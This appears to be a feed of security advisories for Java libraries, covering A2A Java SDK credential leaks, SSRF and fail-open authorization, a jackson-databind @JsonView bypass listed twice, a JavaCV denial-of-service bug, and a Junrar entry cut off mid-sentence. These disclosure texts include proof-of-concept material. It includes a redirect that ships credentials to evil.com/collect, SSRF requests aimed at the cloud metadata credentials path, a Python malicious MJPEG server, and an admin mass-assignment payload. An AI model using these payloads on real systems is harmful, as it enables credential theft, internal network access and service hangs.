entry.title: [org.a2aproject.sdk:a2a-java-sdk-transport-rest] A2A Java SDK: Push notification credentials logged in cleartext on protobuf parse failure
entry.content:
Impact.* Push notification bearer tokens and authentication credentials submitted by clients are written to server log files in cleartext. Any operator, log aggregation system, or attacker with log access can read these secrets and use them to authenticate to the client's push notification endpoints, potentially sending forged task status updates.

Where. transport/rest/src/main/java/org/a2aproject/sdk/transport/rest/handler/RestHandler.java:676 in parseRequestBody

What. The parseRequestBody method logs the entire JSON request body at SEVERE level when JsonFormat.parser().merge() throws InvalidProtocolBufferException. This method is called from createTaskPushNotificationConfiguration (line 377), where the body contains client-supplied push notification bearer tokens (field token) and authentication credentials (field authentication.credentials). These secrets are written to server log files in full.

Exploit scenario. A client creates a push notification configuration by POSTing to /v1/tenants/{tenant}/tasks/{taskId}/pushNotificationConfigs with a body containing {"url": "https://client.example.com/webhook", "token": "secret-bearer-token", "authentication": {"scheme": "Bearer", "credentials": "oauth-access-token"}, "extraField": "value"}. The extra field causes JsonFormat.parser().merge() to throw InvalidProtocolBufferException. The entire body including secret-bearer-token and oauth-access-token is logged at SEVERE level. An attacker with log access retrieves the cleartext credentials.

Preconditions.

  • Attacker must have access to server log files (centralized logging, log aggregation, shared infrastructure, or insider access)
  • Push notification capability must be enabled
  • A request body must fail protobuf deserialization while being valid JSON (unknown fields with strict parsing, schema mismatches)

Fix. Do not log the raw request body. Log only a sanitized summary — body length and content type, not content. Replace the log call with something like: log.log(Level.SEVERE, "Error parsing JSON request body (length={0})", body != null ? body.length() : 0).

Verification. 3/3 lens verifiers confirmed.

References

  • https://github.com/a2aproject/a2a-java/security/advisories/GHSA-x32g-jvvm-4725
  • https://nvd.nist.gov/vuln/detail/CVE-2026-111762
  • https://github.com/a2aproject/a2a-java/commit/88827105fee0daaac0d883a4a68eb644571d7230
  • https://github.com/a2aproject/a2a-java/releases/tag/v1.3.0.Final
  • https://github.com/advisories/GHSA-x32g-jvvm-4725

entry.title: [org.a2aproject.sdk:a2a-java-sdk-http-client-android] A2A Java SDK: Android synchronous POST forwards credentials across authorities after incomplete redirect fix
entry.content:
The GHSA-9rhm fix added this safe setting in AndroidA2AHttpClient.createConnection():

connection.setInstanceFollowRedirects(false);

The synchronous POST builder later overwrites it:

private boolean followRedirects = true;

public A2AHttpResponse post() throws IOException {
    HttpURLConnection connection = createConnection("POST", false);
    connection.setInstanceFollowRedirects(followRedirects);
    // ...
}

The second assignment wins. JSONRPCTransport and RestTransport both add interceptor-produced headers and call synchronous post() without setting followRedirects(false).

On Android's repackaged OkHttp implementation, a cross-authority redirect strips Authorization but retains nonstandard request headers. AuthInterceptor permits four nonstandard authentication header names:

X-API-Key
API-Key
X-Auth-Token
X-Authentication

I confirmed that the exact v1.3.1.Final Maven artifact forwards complete synthetic values under all four names to a second loopback authority. I also reproduced the supported AuthInterceptor to Android POST path. Explicitly calling followRedirects(false) returns the original 302 and produces no request to the collector.

All test traffic stayed on two ephemeral 127.0.0.1 listeners. All credentials were synthetic FULCRUM-SYNTHETIC-* values.

Reproduction

I have attached AndroidA2AHttpClientRedirectTest.java. Copy it to:

extras/http-client-android/src/test/java/org/a2aproject/sdk/client/http/android/

Run:

mvn -pl extras/http-client-android -am \
  -Dtest=AndroidA2AHttpClientRedirectTest \
  -Dsurefire.failIfNoSpecifiedTests=false test

On unpatched current main, the default test fails with:

Android synchronous POST must retain the documented no-redirect default
expected: <302> but was: <200>

The explicit followRedirects(true) control still passes.

The separate exact-artifact fixture passed three consecutive runs. Its relevant output was:

default status=200 x-api-key=FULCRUM-SYNTHETIC-DIRECT

authorization=null method=GET control-followRedirects-false status=302 collectorHits=0 interceptor-chain status=200 x-api-key=FULCRUM-SYNTHETIC-INTERCEPTOR collectorHits=1 header-matrix name=X-API-Key forwarded=FULCRUM-SYNTHETIC-X-API-Key header-matrix name=API-Key forwarded=FULCRUM-SYNTHETIC-API-Key header-matrix name=X-Auth-Token forwarded=FULCRUM-SYNTHETIC-X-Auth-Token header-matrix name=X-Authentication forwarded=FULCRUM-SYNTHETIC-X-Authentication

Impact and limitations

The demonstrated impact is disclosure of a complete API key or authentication token to a different authority. I am not claiming subsequent use of the credential, integrity impact, availability impact, code execution, or host compromise.

A fully malicious origin already receives the credential on the first request. The additional boundary matters most when redirect or front-door behavior is compromised separately from the component that handles request credentials, or when different parts of the origin operate in different trust domains.

The 7.5 score applies to an autonomous client where no human action is needed after the remote endpoint returns the redirect. If the Android workflow requires a person to select or invoke the remote agent, UI:R gives a 6.5 score. I have kept both vectors because that deployment detail affects severity but not the underlying behavior. These are suggested scores, consistent with the policy's statement that actual CVSS depends on the specific deployment context. The same policy labels the parent credential-redirect property as moderate.

Scope and prior art

This path appears to fall directly under the project's current security model:

  1. extras/http-client-android and the client transports are listed as in scope.
  2. Remote AgentCard and response data are treated as attacker-relevant inputs.
  3. A malicious or compromised remote agent is part of the client-side adversary model.
  4. Section 8 says automatic redirects are disabled in all JDK, Vert.x, and Android implementations to prevent credential leakage.
  5. Section 13 defines a violation of a Section 8 property through the covered input and adversary as VALID.
  6. Section 13a lists missed call sites and under-strength mitigations as new findings after an incomplete fix.
  7. Section 14 records the original issue as fixed by disabling redirects across all HTTP client implementations. The Android synchronous path directly contradicts that recorded repair state.

This report does not claim that an AgentCard SecurityScheme declaration enforces authentication. The application has already configured the credential, and the shipped AuthInterceptor places it in an allowed header. The failure is the Android client's default redirect behavior after that point. It does not depend on a custom SPI, an insecure configuration flag, a test-only component, server-side authentication, or any of the recurring non-findings listed in Section 11a.

GHSA-9rhm is the direct parent finding. Its fix commit says redirects were disabled across all clients, but the Android POST-level override remains in 1.3.0.Final, 1.3.1.Final, and current main. I searched the public issues and pull requests on September 5 and found PR #1097, but no report covering this surviving synchronous Android path. The other three published advisories address server authorization defaults, push-notification SSRF, and credential logging. They do not cover this Android client path.

Suggested fix

The smallest compatible change is:

- private boolean followRedirects = true;
+ private boolean followRedirects = false;

This keeps followRedirects(true) available as an explicit opt-in. The attached regression passes three out of three times after the change. The Android module and its reactor dependencies pass 455 tests with no failures. The full repository test run passes 2,914 tests with no failures or errors. It reports 127 skips when using the project's documented -DskipDockerTests=true option inside the isolated build container.

References

Security property: https://github.com/a2aproject/a2a-java/blob/30e31086e24bea096b5f662088661269c9119100/SECURITY.md#L335-L342

Triage and incomplete-fix rules: https://github.com/a2aproject/a2a-java/blob/30e31086e24bea096b5f662088661269c9119100/SECURITY.md#L547-L573

Android documentation: https://github.com/a2aproject/a2a-java/blob/30e31086e24bea096b5f662088661269c9119100/docs/content/dev/security.md#L60-L74

Safe connection setting and later POST override: https://github.com/a2aproject/a2a-java/blob/30e31086e24bea096b5f662088661269c9119100/extras/http-client-android/src/main/java/org/a2aproject/sdk/client/http/android/AndroidA2AHttpClient.java#L95-L114 https://github.com/a2aproject/a2a-java/blob/30e31086e24bea096b5f662088661269c9119100/extras/http-client-android/src/main/java/org/a2aproject/sdk/client/http/android/AndroidA2AHttpClient.java#L269-L300

AuthInterceptor allowlist and credential injection: https://github.com/a2aproject/a2a-java/blob/30e31086e24bea096b5f662088661269c9119100/client/transport/spi/src/main/java/org/a2aproject/sdk/client/transport/spi/interceptors/auth/AuthInterceptor.java#L33-L46 https://github.com/a2aproject/a2a-java/blob/30e31086e24bea096b5f662088661269c9119100/client/transport/spi/src/main/java/org/a2aproject/sdk/client/transport/spi/interceptors/auth/AuthInterceptor.java#L85-L90

Parent advisory and fix: https://github.com/a2aproject/a2a-java/security/advisories/GHSA-9rhm-2h4x-jwmx https://github.com/a2aproject/a2a-java/commit/2a36530d75e11bcf9b81f543464dbe193ca6478e

Android redirect implementation: https://android.googlesource.com/platform/external/okhttp/+/05b3c271102f7e16bd772dd8a9dab5c6b1424c24/repackaged/okhttp/src/main/java/com/android/okhttp/internal/http/HttpEngine.java#900

entry.title: [org.a2aproject.sdk:a2a-java-sdk-server-common] A2A Java SDK has Server-Side Request Forgery (SSRF) in push-notification delivery
entry.content:
• Ecosystem: Maven
  • Affected package: org.a2aproject.sdk:a2a-java-sdk-server-common (push-notification delivery)
  • Affected versions: <= 1.2.0.Final (and 1.2.1.Final-SNAPSHOT on main prior to the fix)
  • Patched version: (the release that carries the fix)
  • CWE: CWE-918 (Server-Side Request Forgery)
  • Severity: High
  • CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N (5.8, Moderate)

Summary

An unauthenticated attacker can coerce the a2a-java server into issuing HTTP requests to arbitrary internal and cloud-metadata endpoints from the server's own network position — a Server-Side Request Forgery reachable in the default deployment with no credentials, no user interaction, and a single request. The behaviour is the shipped default, not a misconfiguration.

Details

BasePushNotificationSender (in server-common) POSTs task data to the URL stored on a task's TaskPushNotificationConfig with no validation of the destination: no block on loopback, RFC1918, link-local (169.254.0.0/16, including the 169.254.169.254 metadata address), unique-local, unspecified, or multicast ranges; no scheme restriction; and no bound on redirects. InMemoryPushNotificationConfigStore.setInfo stores the URL verbatim and onCreateTaskPushNotificationConfig does not check it either.

Both shipped HTTP clients follow redirects (JdkA2AHttpClient → followRedirects(NORMAL), VertxA2AHttpClient → setFollowRedirects(true)), so a creation-time URL allowlist is bypassable: an attacker webhook answers 302 Location: http://169.254.169.254/... and the client follows it. A hostname check is likewise defeated by DNS rebinding. A correct guard must validate the resolved IP of every hop at connection time, not the URL string.

Exploitation

Demonstrated end-to-end against a running server (default wiring, unauthenticated caller):

  • Arbitrary internal reachability. The attacker picks the destination and the server issues the request from inside the trust boundary. Delivery to loopback and to a real RFC1918 LAN address was exercised at runtime; because the code applies no destination filtering of any kind, the same path reaches link-local / metadata (169.254.169.254) and other internal ranges wherever network routing permits.
  • Allowlist + method bypass via redirect. A 302 from the attacker's webhook reaches destinations a creation-time allowlist would block, and a 302 on a POST is followed as a GET — so GET-only endpoints such as the IMDS credentials path are reachable even though the sender only issues POSTs. This is why a URL allowlist is not a sufficient fix; the guard must validate the resolved IP of every redirect hop.
  • Data push into internal services. On direct (non-redirected) delivery, each request carries the task payload in the body, so internal services that ingest POST data receive attacker-influenced content (basis for I:L). On a redirected request the body is dropped in the POST→GET conversion, so the body-push and the redirect-reach are separate capabilities, not simultaneous on one request.

The sender discards the fetched response and exposes no caller-visible difference between a successful and a failed delivery (both paths return without surfacing status or body), so the base case reads back nothing — confidentiality is scored C:N. Read-back is limited, reach is not: the attacker still drives fully controlled requests to metadata and internal services and writes data into them.

PoC

Against a running server with push notifications enabled (JSON-RPC transport), using only the real production classes wired the default way:

  1. Start a local listener standing in for an internal target (no real metadata service is touched).

  2. Send one SendMessage that starts a long-running task, with the push config inlined and its url set to http://<internal-target>/latest/meta-data/iam/security-credentials/. Use returnImmediately: true, header A2A-Version: 1.0, and role ROLE_USER. The URL is stored verbatim. (Equivalent via CreateTaskPushNotificationConfig on an existing task.)

  3. As the task emits state/artifact updates, the sender POSTs each one to the stored URL, from the server's own network position:

    POST /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
Content-Type: application/json

{"artifactUpdate":{"taskId":"...","artifact":{"parts":[{"text":"Progress update 1/20"}]}, ...}}

One SendMessage produced multiple server-side POSTs to the attacker-chosen internal path. Verified on main (commit 72d220c, JDK 21) and unchanged on 1.2.0.Final.

Remediation

Validate the resolved IP of the target and of every redirect hop before connecting: reject loopback / RFC1918 / link-local / metadata / unique-local / unspecified / multicast; restrict the scheme to http/https; cap redirects; and resolve-and-pin to defeat DNS rebinding. Enable by default, with a documented opt-out for deployments that intentionally target internal webhooks. The Go A2A SDK ships a dial-time resolved-IP guard of this shape by default.

Workaround: until a fixed release, block the host's outbound egress to the metadata endpoint and internal ranges at the network layer.

References

  • CWE-918: Server-Side Request Forgery: https://cwe.mitre.org/data/definitions/918.html

References

  • https://github.com/a2aproject/a2a-java/security/advisories/GHSA-q78c-5jjq-57g8
  • https://nvd.nist.gov/vuln/detail/CVE-2026-111761
  • https://github.com/a2aproject/a2a-java/pull/1096
  • https://github.com/a2aproject/a2a-java/commit/b855b2ae37e4bf23f73e7746ce166fbc5a0b8b5b
  • https://github.com/a2aproject/a2a-java/releases/tag/v1.3.0.Final
  • https://github.com/advisories/GHSA-q78c-5jjq-57g8

entry.title: [org.a2aproject.sdk:a2a-java-sdk-server-common] A2A Java SDK has a fail-open default task authorization
entry.content:
Draft text for GHSA-qw47-mcm5-934w. The body below drops into the GitHub advisory description field; the metadata block maps to the form fields. Set the patched version at release; publish when the fix ships._

  • Ecosystem: Maven
  • Affected package: org.a2aproject.sdk:a2a-java-sdk-server-common (task store / authorization)
  • Affected versions: <= 1.2.0.Final (and 1.2.1.Final-SNAPSHOT on main prior to the fix)
  • Patched version: (the release that carries the fix, e.g. 1.2.1.Final)
  • CWE: CWE-1188 (Insecure Default Initialization), CWE-862 (Missing Authorization)
  • Severity: High
  • CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5, High)

Details

The default task store performs no authorization on task reads. InMemoryTaskStore's no-arg constructor sets authorizationProvider = null, and InMemoryTaskStore.get(String taskId) is a bare map lookup with no authorization check regardless of provider:

public InMemoryTaskStore() {
    this.authorizationProvider = null;   // default wiring
}

@Override
public @Nullable Task get(String taskId) {
    return tasks.get(taskId);            // no owner / caller check
}

Authorization is enforced only when the application both supplies a TaskAuthorizationProvider and routes requests through AuthorizationRequestHandlerDecorator (via CDI), which checks ownership before delegating. A server that uses the default store, or wires DefaultRequestHandler.builder().build() manually, or integrates through a non-CDI stack (e.g. Spring), never reaches that check. The safe posture is therefore opt-in and the shipped default is the unsafe one. A caller can read a task created by another caller simply by knowing or guessing its id.

Summary

With the SDK's default configuration, task reads are not authorized: any caller can retrieve a task (including its status, context, message history, and artifacts) created by another caller, by supplying the task id.

PoC

Using only the real production classes wired the default way (no mocks):

  1. Construct the default store: InMemoryTaskStore store = new InMemoryTaskStore(); (no-arg constructor, so no authorization provider).
  2. As one caller, save a task: store.save(victimTask, false); with id victim-task-42.
  3. As a second, unrelated caller with no auth context, read it back: store.get("victim-task-42").

The second caller receives the first caller's task in full, with no authorization check:

unauthenticated get(victim-task-42) returned task owned by nobody-checked: victim-task-42 / ctx=victim-ctx

Verified on main (commit 72d220c, JDK 21) and reproduces unchanged on 1.2.0.Final.

Impact

Task data crosses caller boundaries with no authorization. In any multi-caller deployment built on the default wiring, one caller can enumerate and read another caller's tasks, including task status, context id, the message history, and any artifacts the task carries, which for agent workloads is frequently sensitive input and generated content. Because the insecure behaviour is the default rather than a misconfiguration, it is easy to ship unintentionally, and in the default/reference deployment the transport endpoints are served without authentication enforced, so the read is reachable by an unauthenticated caller (PR:N). CVSS is scored against the default configuration as shipped.

Remediation

Fail closed by default: deny task reads when no authorization provider is configured, rather than treating a missing provider as allow-all, and apply the authorization check in the store's get path (not only in list and the CDI decorator) so it holds regardless of how the handler is wired. If the current permissive default is retained for single-user/testing scenarios, emit a prominent startup warning when the server comes up with no authorization provider so it cannot be shipped by accident.

Workarounds

Until a fixed release, configure a TaskAuthorizationProvider and ensure requests are routed through the authorization decorator (CDI wiring), rather than relying on the default no-arg store or a manually built handler.

References

  • CWE-1188: Insecure Default Initialization of Resource: https://cwe.mitre.org/data/definitions/1188.html
  • CWE-862: Missing Authorization: https://cwe.mitre.org/data/definitions/862.html

References

  • https://github.com/a2aproject/a2a-java/security/advisories/GHSA-qw47-mcm5-934w
  • https://nvd.nist.gov/vuln/detail/CVE-2026-111764
  • https://github.com/a2aproject/a2a-java/pull/1095
  • https://github.com/a2aproject/a2a-java/commit/efb4e985e99390c4fc1f78c0a187a4254c0a2553
  • https://github.com/a2aproject/a2a-java/releases/tag/v1.3.0.Final
  • https://github.com/advisories/GHSA-qw47-mcm5-934w

entry.title: [org.a2aproject.sdk:a2a-java-sdk-parent] A2A Java SDK send client credentials under server-controlled HTTP header name, enabling leakage via redirect
entry.content:
Impact.* A malicious or compromised A2A agent can cause the client's API key credential to be forwarded to an arbitrary third-party server. The agent serves an AgentCard with an APIKeySecurityScheme specifying a custom header name, then responds with an HTTP redirect. The JDK HttpClient follows the redirect and forwards the custom header containing the credential, since only the standard Authorization header may be stripped on cross-origin redirects.

Where. client/transport/spi/src/main/java/org/a2aproject/sdk/client/transport/spi/interceptors/auth/AuthInterceptor.java:69 in intercept

What. The apiKeySecurityScheme.name() field from the remote agent's AgentCard (untrusted, server-controlled data) is used directly as the HTTP header name when placing client credentials. Combined with JdkA2AHttpClient's followRedirects(NORMAL) policy, credentials under custom header names survive cross-origin redirects (only Authorization is stripped on newer JDKs), allowing a malicious agent to leak client credentials to third-party servers. Additionally, AuthInterceptor does not check that location==HEADER before placing the credential as a header.

Exploit scenario. Client configures an API key credential for agent's security scheme myAuth. The malicious agent returns an AgentCard where securitySchemes includes myAuth as APIKeySecurityScheme with name='X-Leaked-Cred' and location=HEADER. AuthInterceptor places the credential in the X-Leaked-Cred header. The agent responds with HTTP 302 redirect to https://evil.com/collect. JdkA2AHttpClient follows the redirect, forwarding all custom headers including X-Leaked-Cred to evil.com. The attacker captures the client's credential.

Preconditions.

  • Client application has configured API key credentials via CredentialService for the agent's security scheme
  • The agent is malicious or compromised (controls its own AgentCard response)
  • The default JdkA2AHttpClient is used (with followRedirects=NORMAL)
  • The JDK version does not strip custom headers on cross-origin redirects (all current versions)

Fix. Validate the APIKeySecurityScheme.name() field against a whitelist of safe header names. Check that apiKeySecurityScheme.location() equals Location.HEADER before placing the credential as a header. Consider using followRedirects(NEVER) and implementing manual redirect handling that strips all authentication headers on cross-origin redirects.

Verification. 2/3 lens verifiers confirmed.

References

  • https://github.com/a2aproject/a2a-java/security/advisories/GHSA-4fpj-g9jf-9rgg
  • https://github.com/a2aproject/a2a-java/security/advisories/GHSA-9rhm-2h4x-jwmx
  • https://nvd.nist.gov/vuln/detail/CVE-2026-111763
  • https://github.com/a2aproject/a2a-java/pull/1097
  • https://github.com/a2aproject/a2a-java/commit/2a36530d75e11bcf9b81f543464dbe193ca6478e
  • https://github.com/a2aproject/a2a-java/releases/tag/v1.3.0.Final
  • https://github.com/advisories/GHSA-9rhm-2h4x-jwmx

entry.title: [com.fasterxml.jackson.core:jackson-databind] jackson-databind: @JsonView bypassed for @JsonUnwrapped container properties on deserialization
entry.content:
Summary

UnwrappedPropertyHandler.processUnwrapped() replays the buffered JSON for a @JsonUnwrapped property by iterating its properties and calling prop.deserializeAndSet() with no prop.visibleInView(ctxt.getActiveView()) guard — the exact guard processUnwrappedCreatorProperties() received in the #5971 / GHSA-rcqc-6cw3-h962 fix, and the guard BeanDeserializer.deserializeWithUnwrapped applies to directly-matched properties. As a result, a property annotated with both @JsonView(PrivilegedView.class) and @JsonUnwrapped is written from attacker JSON even when deserializing under a more-restrictive active view.

Correction to the original framing (runtime-verified): the gap is NOT a per-field inner @JsonView (the unwrapped sub-object's own BeanDeserializer gates inner fields correctly). The unchecked gate is the view of the unwrapped CONTAINER property.

Intent proof (runtime, 2.x HEAD 21dd70dd and 3.x HEAD 7a5939d6)

An @JsonView(AdminView) property that is NOT @JsonUnwrapped → null under PublicView (correctly gated). The identical property WITH @JsonUnwrapped → fully populated (bypass). The fix the creator path already received, not applied to the regular-property method.

Impact — write-side mass-assignment / privilege escalation

@JsonView is commonly used as a write-side authorization guard: a public endpoint binds the body under readerWithView(PublicView.class) and groups privileged state in a nested object whose container property is @JsonView(AdminView). When that property is @JsonUnwrapped, an untrusted caller mass-assigns it. PoC: a self-service registration where AccountFlags{role,approved,creditBalance} is @JsonView(AdminView) @JsonUnwrapped; attacker JSON {role:ADMIN,approved:true,creditBalance:1000000} under PublicView binds all three → approved admin with arbitrary balance. The failing gate is a WRITE gate, hence integrity-high (C:N/I:H/A:N); no worse than the C:L/I:L parent and arguably higher as @JsonView-as-write-guard is the exact use case #5971/#5969 defended.

Affected

  • com.fasterxml.jackson.core:jackson-databind 2.x: confirmed bypass at 21dd70dd (== released 2.21.4 / 2.22.0 line; includes the #5973 backport). DEFAULT_VIEW_INCLUSION default=true.
  • tools.jackson.core:jackson-databind 3.x: confirmed bypass at HEAD 7a5939d6 (latest 3.x). DEFAULT_VIEW_INCLUSION default=false → the stock-config repro is the common shape where privileged inner fields are individually @JsonView(PublicView) and the developer relies on the container @JsonView(AdminView); the 3.x PoC mass-assigns role/approved/creditBalance under PublicView. (The other simultaneous report's PoC was reportedly fixed on 3.x; this distinct container-property path is not.)

Additive variants (runtime-confirmed both branches; all closed by the same one-line guard)

  • nested @JsonUnwrapped (unwrapped-in-unwrapped) — recursive bypass.
  • merge / readerWithView(...).withValueToUpdate(...) (PATCH/partial-update) — bypass; non-unwrapped merge control gates correctly.
  • builder-based deserializer (@JsonDeserialize(builder=...)) — BuilderBasedDeserializer routes through the same processUnwrapped.
  • Honest non-findings: read-side serialization correctly honors views (no leak); @JsonAnySetter+view and @JsonTypeInfo+@JsonUnwrapped are separate/unsupported behaviors, not this bug.

Fix

Add prop.visibleInView(ctxt.getActiveView()) (when MapperFeature.DEFAULT_VIEW_INCLUSION/active-view applies) to the processUnwrapped() property loop, mirroring processUnwrappedCreatorProperties(). One change closes the impact PoC + all three variants across BeanDeserializer and BuilderBasedDeserializer. Full runnable PoCs (2.x + 3.x) + variant harnesses available on request.

entry.title: [com.fasterxml.jackson.core:jackson-databind] jackson-databind: @JsonView bypassed for @JsonUnwrapped container properties on deserialization
entry.content:
Summary

UnwrappedPropertyHandler.processUnwrapped() replays the buffered JSON for a @JsonUnwrapped property by iterating its properties and calling prop.deserializeAndSet() with no prop.visibleInView(ctxt.getActiveView()) guard — the exact guard processUnwrappedCreatorProperties() received in the #5971 / GHSA-rcqc-6cw3-h962 fix, and the guard BeanDeserializer.deserializeWithUnwrapped applies to directly-matched properties. As a result, a property annotated with both @JsonView(PrivilegedView.class) and @JsonUnwrapped is written from attacker JSON even when deserializing under a more-restrictive active view.

Correction to the original framing (runtime-verified): the gap is NOT a per-field inner @JsonView (the unwrapped sub-object's own BeanDeserializer gates inner fields correctly). The unchecked gate is the view of the unwrapped CONTAINER property.

Intent proof (runtime, 2.x HEAD 21dd70dd and 3.x HEAD 7a5939d6)

An @JsonView(AdminView) property that is NOT @JsonUnwrapped → null under PublicView (correctly gated). The identical property WITH @JsonUnwrapped → fully populated (bypass). The fix the creator path already received, not applied to the regular-property method.

Impact — write-side mass-assignment / privilege escalation

@JsonView is commonly used as a write-side authorization guard: a public endpoint binds the body under readerWithView(PublicView.class) and groups privileged state in a nested object whose container property is @JsonView(AdminView). When that property is @JsonUnwrapped, an untrusted caller mass-assigns it. PoC: a self-service registration where AccountFlags{role,approved,creditBalance} is @JsonView(AdminView) @JsonUnwrapped; attacker JSON {role:ADMIN,approved:true,creditBalance:1000000} under PublicView binds all three → approved admin with arbitrary balance. The failing gate is a WRITE gate, hence integrity-high (C:N/I:H/A:N); no worse than the C:L/I:L parent and arguably higher as @JsonView-as-write-guard is the exact use case #5971/#5969 defended.

Affected

  • com.fasterxml.jackson.core:jackson-databind 2.x: confirmed bypass at 21dd70dd (== released 2.21.4 / 2.22.0 line; includes the #5973 backport). DEFAULT_VIEW_INCLUSION default=true.
  • tools.jackson.core:jackson-databind 3.x: confirmed bypass at HEAD 7a5939d6 (latest 3.x). DEFAULT_VIEW_INCLUSION default=false → the stock-config repro is the common shape where privileged inner fields are individually @JsonView(PublicView) and the developer relies on the container @JsonView(AdminView); the 3.x PoC mass-assigns role/approved/creditBalance under PublicView. (The other simultaneous report's PoC was reportedly fixed on 3.x; this distinct container-property path is not.)

Additive variants (runtime-confirmed both branches; all closed by the same one-line guard)

  • nested @JsonUnwrapped (unwrapped-in-unwrapped) — recursive bypass.
  • merge / readerWithView(...).withValueToUpdate(...) (PATCH/partial-update) — bypass; non-unwrapped merge control gates correctly.
  • builder-based deserializer (@JsonDeserialize(builder=...)) — BuilderBasedDeserializer routes through the same processUnwrapped.
  • Honest non-findings: read-side serialization correctly honors views (no leak); @JsonAnySetter+view and @JsonTypeInfo+@JsonUnwrapped are separate/unsupported behaviors, not this bug.

Fix

Add prop.visibleInView(ctxt.getActiveView()) (when MapperFeature.DEFAULT_VIEW_INCLUSION/active-view applies) to the processUnwrapped() property loop, mirroring processUnwrappedCreatorProperties(). One change closes the impact PoC + all three variants across BeanDeserializer and BuilderBasedDeserializer. Full runnable PoCs (2.x + 3.x) + variant harnesses available on request.

entry.title: [org.bytedeco:javacv] JavaCV: Integer Overflow in IPCameraFrameGrabber Causes Infinite-Loop DoS
entry.content:
Summary

IPCameraFrameGrabber parses the Content-Length value from the multipart MJPEG HTTP stream returned by the configured IP camera without any bounds checking. A malicious or compromised camera endpoint - or any network attacker able to tamper with the plaintext HTTP response (these streams are conventionally accessed over http://, as documented in the class itself) - can supply a Content-Length value in the range 1073741825-2147483647. This drives the internal buffer-growth routine ensureBufferCapacity(int) into 32-bit signed integer overflow, which turns the "grow the buffer" loop into a true infinite loop: the loop variable oscillates to 0 and never again satisfies the loop's exit condition. The thread that called grab()/grabBufferedImage() spins at 100% CPU forever and never returns, permanently hanging the calling application's frame-grabbing thread with no exception, timeout, or interrupt path available to the caller.

Details

File: src/main/java/org/bytedeco/javacv/IPCameraFrameGrabber.java

private byte[] readImage() throws IOException {
    ...
    int c0 = subheader.indexOf("content-length: ");
    final int c1 = subheader.indexOf('\r', c0);
    if (c0 < 0) {
        throw new EOFException("The camera stream ended unexpectedly");
    }
    c0 += 16;
    final int contentLength = Integer.parseInt(subheader.substring(c0, c1).trim());   // <-- fully attacker-controlled
    // adaptive size - careful - don't want a 2G jpeg
    ensureBufferCapacity(contentLength);                                              // <-- no upper bound enforced
    input.readFully(pixelBuffer, 0, contentLength);
    ...
}

private void ensureBufferCapacity(int desiredCapacity) {
    int capacity = pixelBuffer.length;          // starts at 1024
    while (capacity < desiredCapacity) {
        capacity *= 2;                          // <-- unchecked int multiplication
    }
    if (capacity > pixelBuffer.length) {
        pixelBuffer = new byte[capacity];
    }
}

contentLength is taken verbatim from the HTTP response headers of the camera stream and passed directly into ensureBufferCapacity with no upper-bound validation (the comment "adaptive size - careful - don't want a 2G jpeg" shows the author was aware of the risk but never implemented a check).

ensureBufferCapacity repeatedly doubles capacity (a 32-bit int, starting at pixelBuffer.length == 1024) until it is >= desiredCapacity. If desiredCapacity is greater than 2^30 (1073741824) but <= Integer.MAX_VALUE (2147483647):

  1. capacity reaches 2^30 (1073741824) after 20 doublings; the loop condition capacity < desiredCapacity is still true.
  2. capacity *= 2 computes 2^31, which overflows a signed 32-bit int and wraps to Integer.MIN_VALUE (-2147483648).
  3. The loop condition capacity < desiredCapacity (a negative number compared to a large positive desiredCapacity) is still true, so the loop continues.
  4. capacity *= 2 computes Integer.MIN_VALUE * 2, which in two's-complement 32-bit arithmetic wraps to 0.
  5. From this point on, capacity is permanently 0 (0 * 2 == 0), and 0 < desiredCapacity remains true forever - the while loop never terminates.

This is a pure CPU-bound loop with no I/O, no blocking call, and no InterruptedException check, so it cannot be interrupted via Thread.interrupt() and will not respect any readTimeout/connectionTimeout configured on the grabber (those only apply to the socket read that happens before this code path). The only remedy is killing the JVM/thread from outside.

PoC

A minimal malicious/MITM'd MJPEG server that reproduces the hang:

import socket

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 8080))
srv.listen(1)
print("listening on :8080")
conn, _ = srv.accept()
conn.recv(4096)  # swallow the client's request

# Any value in (1073741824, 2147483647] triggers the overflow.
malicious_length = 2000000000
header = (
    "--myboundary\r\n"
    "Content-Type: image/jpeg\r\n"
    "Content-Length: %d\r\n\r\n" % malicious_length
)
conn.sendall(header.encode())
# The client will now spin forever inside ensureBufferCapacity()
# before ever attempting to read the (fake) body.

Java client (representative of any application embedding javacv to view an "IP camera" URL):

import org.bytedeco.javacv.IPCameraFrameGrabber;
import java.util.concurrent.TimeUnit;

public class Poc {
    public static void main(String[] args) throws Exception {
        IPCameraFrameGrabber grabber = new IPCameraFrameGrabber(
            "http://127.0.0.1:8080/videostream.cgi", 5, 5, TimeUnit.SECONDS);
        grabber.start();
        grabber.grab(); // never returns; thread pegs a CPU core at 100% forever
    }
}

Running the client against the malicious server above causes grab() to hang permanently, consuming a full CPU core, regardless of the startTimeout/grabTimeout passed to the constructor.

Impact

Any application that uses IPCameraFrameGrabber to consume a camera/MJPEG stream from a source that is not fully trusted - including the common case of plain http:// streams (as shown in the class's own documented examples: http://host/videostream.cgi?...) that can be tampered with by a network-position attacker - can be forced into a permanent, unrecoverable CPU-spinning hang of the grabbing thread by a single crafted response header. No authentication, JPEG payload, or actual data transfer is required; the malicious header alone is sufficient. Repeated exploitation against a server that spawns a grabber thread per client/camera (a common pattern for video-surveillance/monitoring backends) can exhaust available threads/CPU, resulting in a broader denial of service.

  • https://github.com/bytedeco/javacv/commit/cd1977800b827beadf3c53c4032e57172845e0b4
  • https://github.com/bytedeco/javacv/releases/tag/1.5.14
  • https://github.com/advisories/GHSA-rxjv-24xq-76wc

entry.title: [com.github.junrar:junrar] Junrar: RarVM VM_JMP maxOpCount bypass causes infinite CPU loop during RAR4 extraction
entry.content:
Summary

Junrar's RAR virtual machine can be forced into a deterministic infinite loop while extracting a crafted RAR4 archive. The RarVM.ExecuteCode loop is intended to be bounded by maxOpCount, but jump instructions can bypass this limit when setIP() is called with a target instruction pointer greater than or equal to codeSize.

An unauthenticated attacker who can provide a RAR archive to an application using Junrar.extract() can cause the extraction thread to spin forever, consuming CPU and blocking the process. The issue is a denial of service vulnerability, not remote code execution.

Details

The root cause is in src/main/java/com/github/junrar/unpack/vm/RarVM.java.

setIP() returns early when the target IP is outside the prepared VM program:

